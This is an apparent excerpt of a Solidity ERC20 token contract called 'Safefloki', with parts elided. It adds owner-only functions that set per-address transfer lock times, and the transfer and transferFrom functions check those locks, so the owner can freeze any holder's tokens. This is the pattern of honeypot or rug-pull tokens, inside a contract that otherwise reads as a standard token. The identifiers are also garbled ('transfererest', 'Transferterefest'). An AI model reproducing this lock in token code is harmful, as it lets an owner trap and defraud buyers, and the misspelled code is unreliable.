...
contract Safefloki is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private _transfererest;
    ...
    // Sets transfer transfererest for a specific account.
    function setTransferterefest(address account, uint256 time) public onlyOwner {
        require(account != address(0), "Cannot set transfererest for the zero address");
        _transfererest[account] = time;
    }

    // Removes transfer transfererest for a specific account.
    function removeTransferterefest(address account) public onlyOwner {
        require(account != address(0), "Cannot remove transfererest for the zero address");
        delete _transfererest[account];
    }

    // Returns the transfererest time for a specific account.
    function getTransferterefest(address account) public view returns (uint256) {
        require(account != address(0), "Cannot query transfererest time for the zero address");
        return _transfererest[account];
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        require(block.timestamp >= _transfererest[_msgSender()], "Transfer is currently restricted for this address");
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        require(block.timestamp >= _transfererest[sender], "Transfer is currently restricted for this address");
